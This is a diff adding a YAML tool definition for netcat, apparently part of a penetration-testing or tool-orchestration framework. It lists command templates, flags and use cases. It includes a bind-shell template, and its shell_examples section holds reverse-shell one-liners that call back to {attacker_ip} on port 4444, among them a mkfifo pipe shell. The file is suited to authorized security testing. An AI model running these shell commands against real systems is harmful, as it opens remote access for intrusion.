@@ -1,0 +1,137 @@
+name: netcat
+version: 1.10
+category: networking
+description: "Swiss army knife for networking - port scanning, banner grabbing, file transfer, backdoors"
+
+capabilities:
+  - port_scanning
+  - banner_grabbing
+  - file_transfer
+  - backdoor_creation
+  - port_forwarding
+  - protocol_debugging
+
+target_compatibility:
+  os: [all]
+  protocols: [tcp, udp]
+
+commands:
+  connect:
+    template: "nc {target} {port}"
+    description: "Connect to target port"
+    output_format: interactive
+    estimated_time: null
+  
+  listen:
+    template: "nc -lvnp {port}"
+    description: "Listen on port"
+    output_format: interactive
+    estimated_time: null
+  
+  banner_grab:
+    template: "nc -v {target} {port}"
+    description: "Banner grabbing with verbose output"
+    output_format: text
+    estimated_time: 5
+  
+  port_scan:
+    template: "nc -zv {target} {port_range}"
+    description: "Port scanning"
+    output_format: text
+    estimated_time: 30
+  
+  file_transfer_send:
+    template: "nc -lvnp {port} < {file}"
+    description: "Send file (listener side)"
+    output_format: text
+    estimated_time: null
+  
+  file_transfer_receive:
+    template: "nc {target} {port} > {file}"
+    description: "Receive file (connector side)"
+    output_format: text
+    estimated_time: null
+  
+  reverse_shell:
+    template: "nc -lvnp {port}"
+    description: "Catch reverse shell"
+    output_format: interactive
+    estimated_time: null
+  
+  bind_shell:
+    template: "nc -lvnp {port} -e /bin/bash"
+    description: "Create bind shell (traditional nc only)"
+    output_format: interactive
+    estimated_time: null
+
+output_format: interactive
+requires_auth: false
+requires_root: false  # Binding to privileged ports requires root
+
+variants:
+  traditional: "Original netcat (nc)"
+  openbsd: "OpenBSD netcat (more secure, no -e flag)"
+  ncat: "Nmap's netcat (ncat) with SSL support"
+
+common_use_cases:
+  - "Banner grabbing for service identification"
+  - "Quick file transfers between systems"
+  - "Reverse shell catching during exploitation"
+  - "Port connectivity testing"
+  - "Protocol debugging"
+  - "Simple port scanning"
+
+complementary_tools:
+  - nmap          # Better for port scanning
+  - socat         # More advanced features
+  - ncat          # Modern alternative with encryption
+
+known_issues:
+  - "OpenBSD version lacks -e flag (no direct shell)"
+  - "Unencrypted traffic easily detected"
+  - "Simple reverse shells unstable"
+  - "Limited scripting capabilities"
+
+success_indicators:
+  - "open"
+  - "succeeded"
+  - "Connection"
+  - "Listening"
+
+failure_indicators:
+  - "refused"
+  - "timeout"
+  - "failed"
+
+installation:
+  apt: "apt-get install netcat-traditional (or netcat-openbsd)"
+  brew: "brew install netcat"
+  included_with: "Most Linux distributions"
+
+effectiveness_baseline:
+  connectivity_testing: 0.99
+  banner_grabbing: 0.90
+  file_transfer: 0.85
+  port_scanning: 0.60  # Use nmap instead
+
+important_flags:
+  -l: "Listen mode"
+  -v: "Verbose output"
+  -n: "No DNS resolution"
+  -p: "Port specification"
+  -z: "Zero I/O mode (scanning)"
+  -u: "UDP mode (default is TCP)"
+  -e: "Execute program (not available in OpenBSD version)"
+  -w: "Timeout for connections"
+
+shell_examples:
+  reverse_shell_listener: "nc -lvnp 4444"
+  reverse_shell_windows: "nc -e cmd.exe {attacker_ip} 4444"
+  reverse_shell_linux: "nc -e /bin/bash {attacker_ip} 4444"
+  reverse_shell_openbsd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} 4444 >/tmp/f"
+
+performance_notes:
+  - "Extremely lightweight and fast"
+  - "Available on nearly all systems"
+  - "Single binary, easy to transfer"
+  - "No dependencies"
